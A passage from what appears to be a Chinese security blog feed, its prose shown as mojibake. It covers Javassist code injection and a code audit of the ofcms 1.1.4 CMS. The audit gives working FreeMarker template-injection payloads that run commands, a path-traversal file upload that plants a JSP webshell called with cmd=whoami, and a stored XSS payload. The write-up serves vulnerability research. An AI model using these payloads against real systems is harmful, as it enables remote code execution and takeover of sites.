class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(<span class="number">555</span>, <span class="string">&quot;Sk1y&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„è°ƒç”¨</span></span><br><span class="line">        System.out.println(aClass.getDeclaredMethod(<span class="string">&quot;getid&quot;</span>).invoke(o));</span><br><span class="line">        System.out.println(aClass.getDeclaredMethod(<span class="string">&quot;getname&quot;</span>).invoke(o));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024084732743.png" alt="image-20221024084732743"></p><h2 id="åŠŸèƒ½äºŒï¼šåŠ¨æ€è·å–ç±»æ–¹æ³•"><a href="#åŠŸèƒ½äºŒï¼šåŠ¨æ€è·å–ç±»æ–¹æ³•" class="headerlink" title="åŠŸèƒ½äºŒï¼šåŠ¨æ€è·å–ç±»æ–¹æ³•"></a>åŠŸèƒ½äºŒï¼šåŠ¨æ€è·å–ç±»æ–¹æ³•</h2><p>ä¸€èˆ¬æ­¥éª¤</p><ol><li>è·å–é»˜è®¤ç±»æ± <code>ClassPool classPool = ClassPool.getDefault();</code></li><li>è·å–ç›®æ ‡ç±»<code>CtClass ctClass = classPool.get(&quot;cc2.demo&quot;);</code></li><li>è·å–ç±»çš„æ–¹æ³•<code>CtMethod hello = ctClass.getDeclaredMethod(&quot;hello&quot;);</code></li><li>æ’å…¥ä»»æ„ä»£ç <code>hello.insertBefore(&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</code></li><li>è½¬æ¢ä¸ºclasså¯¹è±¡<code>Class c = ctClass.toClass();</code></li><li>åå°„è°ƒç”¨å¯¹è±¡<code>demo o = (demo)aClass.newInstance();</code></li><li>æ‰§è¡Œæ–¹æ³•<code>o.hello();</code></li></ol><p>é¦–å…ˆæ•´ä¸€ä¸ªæµ‹è¯•ç±»demo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024091218990.png" alt="image-20221024091218990"></p><p>test_javassist2.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// è·å–é»˜è®¤ç±»æ± </span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// è·å–ç›®æ ‡ç±» cc2.demo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc2.demo&quot;</span>);</span><br><span class="line">        <span class="comment">// è·å–ç±»çš„æ–¹æ³•hello</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">hello</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// æ’å…¥ä»»æ„ä»£ç ï¼Œè¿™é‡Œæ’å…¥çš„æ˜¯calc</span></span><br><span class="line">        hello.insertBefore(<span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è½¬æ¢ä¸ºclasså¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–demoå¯¹è±¡</span></span><br><span class="line">        <span class="type">demo</span> <span class="variable">o</span> <span class="operator">=</span> (demo)aClass.newInstance();    <span class="comment">//å¼ºåˆ¶è½¬æ¢ï¼Œåˆ›å»ºdemoç±»å¯¹è±¡</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨helloæ–¹æ³•ï¼Œå‘ç°ä¼šè°ƒç”¨calc</span></span><br><span class="line">        o.hello();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼Œè°ƒç”¨helloæ–¹æ³•ï¼Œä¼šå¼¹è®¡ç®—å™¨</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024092714149.png" alt="image-20221024092714149"></p><h2 id="åŠŸèƒ½ä¸‰ï¼šåŠ¨æ€è·å–ç±»ä¿¡æ¯"><a href="#åŠŸèƒ½ä¸‰ï¼šåŠ¨æ€è·å–ç±»ä¿¡æ¯" class="headerlink" title="åŠŸèƒ½ä¸‰ï¼šåŠ¨æ€è·å–ç±»ä¿¡æ¯"></a>åŠŸèƒ½ä¸‰ï¼šåŠ¨æ€è·å–ç±»ä¿¡æ¯</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//        System.out.println(classPool);</span></span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(test_javassist3.class.getClass()));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc2.demo&quot;</span>);</span><br><span class="line">        System.out.println(ctClass.getName());  <span class="comment">//è·å–ç±»å</span></span><br><span class="line">        System.out.println(ctClass.getSimpleName());    <span class="comment">//è·å–ç±»å</span></span><br><span class="line">        System.out.println(ctClass.getSuperclass().getName());  <span class="comment">//è¶…ç±»</span></span><br><span class="line">        System.out.println(Arrays.toString(ctClass.getInterfaces()));   <span class="comment">//è·å–æ¥å£</span></span><br><span class="line">        <span class="keyword">for</span> (CtConstructor constructor : ctClass.getConstructors()) &#123;</span><br><span class="line">            System.out.println(constructor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (CtMethod method : ctClass.getMethods()) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024094652669.png" alt="image-20221024094652669"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸ªäººæ„Ÿè§‰javassistå¾ˆç¥å¥‡ï¼Œé€šå¸¸æˆ‘ä»¬ç”Ÿæˆclassæ–‡ä»¶ï¼Œæ˜¯é€šè¿‡å¯¹javaæ–‡ä»¶è¿›è¡Œç¼–è¯‘ç”Ÿæˆçš„ï¼Œä½†æ˜¯æœ‰äº†javassistä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥åŠ¨æ€ç”Ÿæˆclassæ–‡ä»¶ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼ŒåŠ¨æ€è·å–ç±»æ–¹æ³•ï¼ŒæŠŠä¸€ä¸ªå®‰å…¨çš„ç±»æ–¹æ³•ï¼Œé€šè¿‡<code>insertBefore</code>å¯ä»¥æ’å…¥ä»»æ„æ¶æ„ä»£ç ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ä¸è¿‡é™åˆ¶åœ¨äºéœ€è¦æœ‰javassistè¿™ä¸ªä¾èµ–ã€‚</p><p>åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œçœ‹åˆ°äº†nice0e3å¸ˆå‚…å…³äºå…æ€çš„ä¸€äº›æƒ³æ³•ï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ğŸ‚ï¼Œæ–‡ç« é“¾æ¥åœ¨<code>å‚è€ƒé“¾æ¥3</code></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol><li><a href="https://www.cnblogs.com/CoLo/p/15383642.html">Javaä¹‹JavassiståŠ¨æ€ç¼–ç¨‹ - Zh1z3ven - åšå®¢å›­ (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/top_code/article/details/51708043">(2æ¡æ¶ˆæ¯) JavaåŠ¨æ€ç¼–ç¨‹ä¹‹javassist_Ricky_Fungçš„åšå®¢-CSDNåšå®¢</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/13811335.html#0x03-%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95">Javaå®‰å…¨ä¹‹JavassiståŠ¨æ€ç¼–ç¨‹ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javassist </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ofcms1.1.4 å†…å®¹ç®¡ç†ç³»ç»Ÿä»£ç å®¡è®¡</title>
      <link href="/2022/10/18/ofcms1-1-4-%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/10/18/ofcms1-1-4-%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>ç¯å¢ƒé…ç½®ä¿å§†çº§æ•™ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Alexz__/article/details/116229266</span><br></pre></td></tr></table></figure><ol><li><p>gitåŠ è½½é¡¹ç›®</p></li><li><p>mavenè®¾ç½®</p></li></ol><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221016160413719.png" alt="image-20221016160413719"></p><ol start="3"><li><p>ç„¶åmavené‡æ–°åŠ è½½é¡¹ç›®</p></li><li><p>é…ç½®tomcat</p></li></ol><p>æ³¨æ„<code>url</code>å’Œ<code>application context</code>æ˜¯ä¸€è‡´çš„</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017095339170.png" alt="image-20221017095339170"></p><p>deployment</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017095420383.png" alt="image-20221017095420383"></p><ol start="5"><li>æ•°æ®åº“é…ç½®</li></ol><p>æ–°å»ºæ•°æ®åº“ï¼Œæ³¨æ„mysqlé©±åŠ¨ï¼Œæˆ‘ä¸‹è½½é©±åŠ¨å¤±è´¥ï¼Œä½¿ç”¨çš„æ˜¯æœ¬åœ°mavenä»“åº“çš„é©±åŠ¨</p><p>è§£å†³åŠæ³•ï¼š<a href="https://blog.csdn.net/fan521dan/article/details/104902294">(9æ¡æ¶ˆæ¯) IDEAè¿æ¥Mysqlå¤±è´¥ï¼šä¸‹è½½é©±åŠ¨å¤±è´¥ï¼ŒFailed todownload Cannot download Read timed out_ç–¯ç‹‚çš„å¸†çš„åšå®¢-CSDNåšå®¢</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017084958316.png" alt="image-20221017084958316"></p><p>å¯¼å…¥æ•°æ®åº“</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017093755923.png" alt="image-20221017093755923"></p><p>é€‰æ‹©ä¹‹å‰åˆ›å»ºçš„ofcms_databaseï¼Œrun</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017093829444.png" alt="image-20221017093829444"></p><p>æŸ¥çœ‹æ•°æ®åº“ï¼Œå¯ä»¥çœ‹åˆ°åˆå§‹åŒ–æˆåŠŸ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017094125072.png" alt="image-20221017094125072"></p><p>å¯åŠ¨ï¼Œåœ¨<code>localhost:8080/ofcms_admin</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017112007508.png" alt="image-20221017112007508"></p><p>ç„¶åé…ç½®ä¹‹åï¼ˆæ•°æ®åº“è¿™é‡Œæˆ‘åˆ é™¤äº†ï¼Œç„¶ååˆæ•´äº†ä¸€éï¼‰</p><p>ç»è¿‡ä¸€æ®µæ—¶é—´çš„åŠ è½½ï¼Œä¼°è®¡ä¸¤ä¸‰åˆ†é’Ÿï¼Œæ˜¾ç¤ºå¦‚ä¸‹</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017113103682.png" alt="image-20221017113103682"></p><h2 id="å…³äºofcmsç›®å½•ç®€æ"><a href="#å…³äºofcmsç›®å½•ç®€æ" class="headerlink" title="å…³äºofcmsç›®å½•ç®€æ"></a>å…³äºofcmsç›®å½•ç®€æ</h2><p><a href="https://blog.csdn.net/Alexz__/article/details/116272080">(9æ¡æ¶ˆæ¯) ä»OFCMSå‡ºå‘ï¼Œæµ…æJavaWebé¡¹ç›®æŠ€æœ¯ç»“æ„åŠå…¶åŠŸèƒ½_Alexz__çš„åšå®¢-CSDNåšå®¢</a></p><p><code>Alexz__</code>å¸ˆå‚…çš„åˆ†æ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017113932206.png" alt="image-20221017113932206"></p><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>æ¨¡æ¿æ³¨å…¥</p><p>é¦–å…ˆéœ€è¦äº†è§£freemarkeræ¨¡æ¿æ³¨å…¥</p><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">FreeMarkeræ¨¡æ¿æ³¨å…¥å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ - Eleven_Liu - åšå®¢å›­ (cnblogs.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017192511608.png" alt="image-20221017192511608"></p><p>ç‚¹å‡»<code>è”ç³»æˆ‘ä»¬</code>ï¼Œå¼¹è®¡ç®—å™¨</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017192624277.png" alt="image-20221017192624277"></p><p>æŸ¥çœ‹pom.xmlï¼Œå…¶ä¸­å«æœ‰freemarker</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017192831167.png" alt="image-20221017192831167"></p><p>è¯¥æ¨¡æ¿è®¾ç½®â€“&gt;æ¨¡æ¿æ–‡ä»¶å¯¹åº”çš„æ–‡ä»¶æ˜¯<code>ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\cms\TemplateController.java</code></p><p>è¿™é‡Œè·å–file_contenté‡‡ç”¨çš„æ˜¯getParameterå‡½æ•°.</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017200507366.png" alt="image-20221017200507366"></p><p>è´´ä¸€äº›æ‰¾çš„payload</p><p>1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freemarker.template.utilityé‡Œé¢æœ‰ä¸ªExecuteç±»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™ä¸ªç±»ä¼šæ‰§è¡Œå®ƒçš„å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<span class="keyword">new</span>å‡½æ•°æ–°å»ºä¸€ä¸ªExecuteç±»ï¼Œä¼ è¾“æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ä½œä¸ºå‚æ•°ï¼Œä»è€Œæ„é€ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freemarker.template.utilityé‡Œé¢æœ‰ä¸ªObjectConstructorç±»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™ä¸ªç±»ä¼šæŠŠå®ƒçš„å‚æ•°ä½œä¸ºåç§°ï¼Œæ„é€ äº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªå¯æ‰§è¡Œå‘½ä»¤çš„å¯¹è±¡ï¼Œä»è€Œæ„é€ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ²¡æˆåŠŸ</span><br><span class="line">freemarker.template.utilityé‡Œé¢çš„JythonRuntimeï¼Œå¯ä»¥é€šè¿‡è‡ªå®šä¹‰æ ‡ç­¾çš„æ–¹å¼ï¼Œæ‰§è¡ŒPythonå‘½ä»¤ï¼Œä»è€Œæ„é€ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os.system(<span class="string">&quot;calc.exe&quot;</span>)&lt;/<span class="meta">@value</span>&gt;</span><br></pre></td></tr></table></figure><p>4</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ²¡æˆåŠŸ</span><br><span class="line">[#ftl][#assign value= <span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()]$&#123; value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3><p>è¿˜æ˜¯ä¹‹å‰çš„<code>ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\cms\TemplateController.java</code>å¯¹åº”çš„save()å‡½æ•°</p><p>åˆ†æå‡½æ•°ï¼Œä¼šæ¥å—dirs,file_name,file_content,åˆ†åˆ«å¯¹åº”ä¸Šä¼ çš„è·¯å¾„ï¼Œæ–‡ä»¶åï¼Œæ–‡ä»¶å†…å®¹ï¼Œå¹¶ä¸”æ²¡æœ‰æ·»åŠ è¿‡æ»¤ï¼ï¼ï¼ï¼Œæ‰€ä»¥å¯ä»¥ä¸Šä¼ jspæœ¨é©¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">resPath</span> <span class="operator">=</span> getPara(<span class="string">&quot;res_path&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">pathFile</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;res&quot;</span>.equals(resPath))&#123;</span><br><span class="line">        pathFile = <span class="keyword">new</span> <span class="title class_">File</span>(SystemUtile.getSiteTemplateResourcePath());</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        pathFile = <span class="keyword">new</span> <span class="title class_">File</span>(SystemUtile.getSiteTemplatePath());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">dirName</span> <span class="operator">=</span> getPara(<span class="string">&quot;dirs&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dirName != <span class="literal">null</span>) &#123;</span><br><span class="line">        pathFile = <span class="keyword">new</span> <span class="title class_">File</span>(pathFile, dirName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> getPara(<span class="string">&quot;file_name&quot;</span>);</span><br><span class="line">    <span class="comment">// æ²¡æœ‰ç”¨getParaåŸå› æ˜¯ï¼ŒgetParaå› ä¸ºå®‰å…¨é—®é¢˜ä¼šè¿‡æ»¤æŸäº›htmlå…ƒç´ ã€‚</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> getRequest().getParameter(<span class="string">&quot;file_content&quot;</span>);</span><br><span class="line">    fileContent = fileContent.replace(<span class="string">&quot;&amp;lt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>).replace(<span class="string">&quot;&amp;gt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pathFile, fileName);</span><br><span class="line">    FileUtils.writeString(file, fileContent);</span><br><span class="line">    rendSuccessJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼Œä¿®æ”¹dirsä¸º<code>../../../static</code>ï¼Œfile_nameä¸º<code>shell.jsp</code>ï¼Œfile_contentä¸º<code>jspä¸€å¥è¯æœ¨é©¬çš„urlç¼–ç </code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018160027581.png" alt="image-20221018160027581"></p><p>ç”Ÿæˆä¸€å¥è¯æœ¨é©¬</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018160036734.png" alt="image-20221018160036734"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/ofcms_admin/static/shell.jsp?cmd=whoami</span><br></pre></td></tr></table></figure><h3 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h3><p>åœ¨ç”¨æˆ·è¯„è®ºå¤„å­˜åœ¨å­˜å‚¨å‹xssæ¼æ´ï¼Œæ— éœ€ç™»å½•åå°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘éšä¾¿æ‰¾äº†ä¸€ä¸ªå…¬å¸æ–°é—»çš„åœ°æ–¹</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017212920373.png" alt="image-20221017212920373"></p><p>æäº¤è¯„è®º</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017212850331.png" alt="image-20221017212850331"></p><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017212813153.png" alt="image-20221017212813153"></p><p>å­˜å‚¨å‹xss</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017213014315.png" alt="image-20221017213014315"></p><p>æºç åˆ†æ</p><p>å¯¹åº”çš„æºç <code>ofcms-api\src\main\java\com\ofsoft\cms\api\v1\CommentApi.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Action(path = &quot;/comment&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommentApi</span> <span class="keyword">extends</span> <span class="title class_">ApiBase</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–å†…å®¹ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiMapping(method = RequestMethod.GET)</span></span><br><span class="line">    <span class="meta">@ParamsCheck(</span></span><br><span class="line"><span class="meta">            &#123;@ParamsCheckType(name = &quot;comment_content&quot;), @ParamsCheckType(name = &quot;content_id&quot;),</span></span><br><span class="line"><span class="meta">                    @ParamsCheckType(name = &quot;site_id&quot;)&#125;)</span></span><br><span class="line">    <span 